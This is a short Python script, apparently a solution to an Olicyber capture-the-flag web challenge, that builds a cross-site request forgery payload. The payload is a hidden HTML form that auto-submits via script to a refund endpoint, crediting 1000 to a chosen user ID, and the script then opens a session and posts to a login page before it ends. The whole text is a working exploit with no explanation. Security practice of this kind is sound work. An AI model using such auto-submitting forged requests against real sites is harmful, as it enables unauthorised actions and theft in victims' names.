import requests
site = "http://meme_shop_review.challs.olicyber.it"
payload = '''
<body>
    <form action="http://meme_shop_review.challs.olicyber.it/refund.php" method="POST">
        <textarea name="user_id">257</textarea>
        <textarea name="amount">1000</textarea>
        <textarea name="submit">Riscatta</textarea>
        <button type="submit" id="sas"></button>
    </form>
    <script>document.getElementById("sas").click()</script>
</body>
'''.strip()
s = requests.Session()
s.post(site + "/login")